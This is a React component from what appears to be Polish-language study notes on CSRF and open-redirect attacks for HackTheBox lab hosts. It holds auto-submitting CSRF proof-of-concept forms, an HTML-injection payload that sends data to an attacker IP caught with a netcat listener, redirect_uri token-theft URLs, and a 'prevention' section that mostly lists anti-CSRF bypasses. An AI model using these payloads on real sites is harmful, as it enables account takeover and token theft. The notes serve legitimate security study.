import csrf_example from '../../../assets/csrf_example.png';
import csrf_result from '../../../assets/csrf_result.png';
import csrf_example_get from '../../../assets/csrf_example_get.png';
import csrf_example_url from '../../../assets/csrf_example_url.png';
import csrf_post_result from '../../../assets/csrf_post_result.png';
import csrf_defense from '../../../assets/csrf_defense.png';
import csrf_open_redirect from '../../../assets/csrf_open_redirect.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const CSRF = () =>{
    return(
        <section>
                <h1>Cross-Site Request Forgery (CSRF)</h1>
                <p>Robimy formularz na postawie requesta</p>
                <ExampleFrame screen={csrf_example} />
                <div className='waring'>
                    <p>{`<html>`}</p>
                    <p className='tab-1'>{`<body>`}</p>
                    <p className='tab-2'>{`<form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">`}</p>
                    <p className='tab-3'>{`<input type="hidden" name="email" value="attacker@htb.net" />`}</p>
                    <p className='tab-3'>{`<input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />`}</p>
                    <p className='tab-3'>{`<input type="hidden" name="country" value="CSRF_POC" />`}</p>
                    <p className='tab-3'>{`<input type="submit" value="Submit request" />`}</p>
                    <p className='tab-2'>{`</form>`}</p>
                    <p className='tab-2'>{`<script>`}</p>
                    <p className='tab-3'>{`document.getElementById("submitMe").submit()`}</p>
                    <p className='tab-2'>{`</script>`}</p>
                    <p className='tab-1'>{`</body>`}</p>
                    <p>{`</html>`}</p>
                </div>
                <p>Następnie włączamy naszą aplikację w przeglądarce<span className='important'>python -m http.server 1337</span> -{`>`} <span className='important'>{`http://<VPN/TUN Adapter IP>:1337/notmalicious.html`}</span></p>
                <ExampleFrame screen={csrf_result} />
                <hr />
                <h2>oparty na GET</h2>
                <ExampleFrame screen={csrf_example_get} />
                <div className='waring'>
                    <p>{`<html>`}</p>
                    <p className='tab-1'>{`<body>`}</p>
                    <p className='tab-2'>{`<form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">`}</p>
                    <p className='tab-3'>{`<input type="hidden" name="email" value="attacker@htb.net" />`}</p>
                    <p className='tab-3'>{`<input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />`}</p>
                    <p className='tab-3'>{`<input type="hidden" name="country" value="CSRF_POC" />`}</p>
                    <p className='tab-3'>{`<input type="hidden" name="action" value="save" />`}</p>
                    <p className='tab-3'>{`<input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />`}</p>
                    <p className='tab-3'>{`<input type="submit" value="Submit request" />`}</p>
                    <p className='tab-2'>{`</form>`}</p>
                    <p className='tab-2'>{`<script>`}</p>
                    <p className='tab-3'>{`document.getElementById("submitMe").submit()`}</p>
                    <p className='tab-2'>{`</script>`}</p>
                    <p className='tab-1'>{`</body>`}</p>
                    <p>{`</html>`}</p>
                </div>

                <hr />

                <h2>oparty na POST/ Delete</h2>
                <ExampleFrame screen={csrf_example_url} />
                <p>Zmieńmy element HTML na <span className='important'>{`<h1>h1<u>underline<%2fu><%2fh1>`}</span></p>
                <div className='waring'>
                    <p>Wprowadzamy Payload który dostarczy nam dane</p>
                    <p><span className='important'>{`<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f`}</span></p>
                    <p>Oraz odpalamy serwer lokalnie</p>
                    <p><span className='important'>nc -nlvp 8000</span></p>
                </div>
                <ExampleFrame screen={csrf_post_result} />

                <hr />

                <h2>Open Redirect</h2>

                <ul className='important'>
                    <li>?url=</li>
                    <li>?link=</li>
                    <li>?redirect=</li>
                    <li>?redirecturl=</li>
                    <li>?redirect_uri=</li>
                    <li>?return=</li>
                    <li>?return_to=</li>
                    <li>?returnurl=</li>
                    <li>?go=</li>
                    <li>?goto=</li>
                    <li>?exit=</li>
                    <li>?exitpage=</li>
                    <li>?fromurl=</li>
                    <li>?fromuri=</li>
                    <li>?redirect_to=</li>
                    <li>?next=</li>
                    <li>?newurl=</li>
                    <li>?redir=</li>
                </ul>

                <p>W przypadku zobaczenia takich url <span className='important'>{`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`}</span>, możemy zmienić na <span>{`http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>`}</span></p>
                <div className='waring'>
                    <p><span className='important'>{`<RANDOM TOKEN ASSIGNED BY THE APP>`}</span>{`<`}-- Zastąp to tokenem, który jest przydzielany automatycznie przez aplikację.</p>
                </div>
                <ExampleFrame screen={csrf_open_redirect} />

                <hr />

                <h2 className='defense'>Zapobieganie</h2>
                <p className='defense'>Ustawienie wartości tokena CSRF na tę samą długość, co oryginalny token CSRF, ale z inną/losową wartością, może również ominąć pewne zabezpieczenia anty-CSRF, które sprawdzają, czy token ma wartość i długość tej wartości. Na przykład, jeśli token CSRF miałby długość 32 bajtów, utworzylibyśmy ponownie token 32-bajtowy.</p>
       
                <h3 className='defense'>Usuń parametr tokena CSRF lub wyślij pusty token</h3>
                <p className='defense'>Niewysłanie tokena działa dość często z powodu następującego częstego błędu logiki aplikacji. Aplikacje czasami sprawdzają ważność tokenu tylko wtedy, gdy token istnieje lub jeśli parametr tokenu nie jest pusty.</p>
                <ExampleFrame screen={csrf_defense} />

                <h3 className='defense'>Ochrona anty-CSRF poprzez nagłówek strony odsyłającej</h3>
                <p className='defense'>Jeśli aplikacja używa nagłówka strony odsyłającej jako mechanizmu zabezpieczającego przed CSRF, możesz spróbować usunąć nagłówek strony odsyłającej. Dodaj następujący metatag do swojej strony hostującej skrypt CSRF.</p>
                <p className='important'>{`<meta name="referrer" content="no-referrer"`}</p>
        </section>
    )
}

export default CSRF;